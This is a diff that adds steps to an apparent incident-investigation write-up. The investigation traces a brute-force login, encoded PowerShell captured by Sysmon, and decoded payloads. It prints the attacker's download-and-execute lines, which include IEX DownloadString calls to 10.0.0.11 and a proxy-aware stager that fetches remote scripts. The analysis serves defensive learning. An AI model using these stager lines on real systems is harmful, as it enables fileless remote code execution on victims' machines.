@@ -124,3 +124,56 @@ Time:        11:20:34 / 11:22:57 / 11:26:26
 > EID 4624 confirms a successful authentication. Coming directly after 436 failed attempts from the same IP, this is **not a coincidence** — the brute force succeeded. The attacker now has valid credentials for user `sarah` on `PC01`.
 
 ---
+## Step 3 — PowerShell Execution: Encoded Command
+
+Immediately after access, **Sysmon Event ID 1** captured `PowerShell.exe` executing with a suspicious `-EncodedCommand` flag under user `sarah`.
+
+> <img width="1331" height="152" alt="1" src="https://github.com/user-attachments/assets/69845bfa-fc22-4a51-b545-59a307dd98c5" />
+
+```
+Process:     C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell.exe
+User:        PC01\sarah
+CommandLine: powershell.exe -EncodedCommand SQBFAFgAKABOAGUAdwAt...
+Time:        2025-11-17T11:21:33
+```
+> ### 🔎 Why Sysmon Event ID 1?
+> Sysmon EID 1 logs every process creation including the full command line. The `-EncodedCommand` flag is a classic attacker technique to hide the real payload from plain-text log monitoring. Anything encoded needs to be decoded immediately — that's the next step.
+
+---
+
+### Step 4 — Payload Decoded: IEX DownloadString
+
+The Base64 encoded command was decoded using **CyberChef** (From Base64 → Decode text UTF-16LE):
+
+> <img width="1094" height="409" alt="2" src="https://github.com/user-attachments/assets/ee770492-be1b-4d64-ace6-8f0a2255a14a" />
+
+
+```powershell
+# First payload decoded:
+IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.11/haha.ps1')
+```
+
+A second encoded command was also captured and decoded:
+
+>  <img width="1331" height="265" alt="4" src="https://github.com/user-attachments/assets/5412ee23-a2db-4d91-ac6d-f5b8d934352d" />
+
+> <img width="1359" height="555" alt="5" src="https://github.com/user-attachments/assets/be563a97-526d-4061-b573-0ae6485d2a39" />
+
+
+
+```powershell
+# Second payload decoded:
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;
+$ja=new-object net.webclient;
+if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){
+  $ja.proxy=[Net.WebRequest]::GetSystemWebProxy();
+  $ja.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
+}
+IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q/Z2oecggFq'));
+IEX ((new-object Net.WebClient).DownloadString('http://10.0.0.11:8080/nj6VXD4hquF64Q'));
+```
+
+> ### 🔎 Why IEX + DownloadString?
+> `Invoke-Expression` + `DownloadString` is a **fileless execution** technique — the attacker downloads a script directly into memory and runs it without writing the main payload to disk. The TLS configuration in the second payload suggests a more sophisticated stager, likely a C2 framework implant (Metasploit/Cobalt Strike/Sliver pattern).
+
+---
